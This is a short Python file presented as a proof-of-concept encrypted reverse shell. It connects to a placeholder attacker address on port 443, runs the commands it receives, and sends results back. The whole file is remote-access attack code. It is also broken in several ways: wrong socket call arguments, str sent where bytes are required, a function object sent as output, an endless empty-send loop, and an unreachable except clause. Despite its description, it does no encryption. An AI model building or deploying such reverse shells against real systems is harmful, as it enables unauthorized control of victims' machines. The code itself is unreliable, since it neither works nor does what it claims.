import socket 
import subprocess
import threading
import argparse
import crypt

""" An Encrypted Reverse_Shell written in Python """
""" POC, meaning, has to be modified for real world use"""

MAX_BUFF = 4096
DEFAULT_PORT = 443
HOST = "ADRESS_OF_ATTACKER"


sock_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def shelled_stripped(data):
    return data.decode("utf-8").strip()

try:
    sock_client.connect(HOST,DEFAULT_PORT)
    sock_client.send("Connection Received.")
    data = sock_client.recv(MAX_BUFF)
    if data:
        subprocess.run(shelled_stripped(data))
        sock_client.send(subprocess.run)
        while True:
            sock_client.send("")
    exit(0)
except Exception as e:
    print()

except Exception as e:
    print("Connection failed")
    exit(1) 


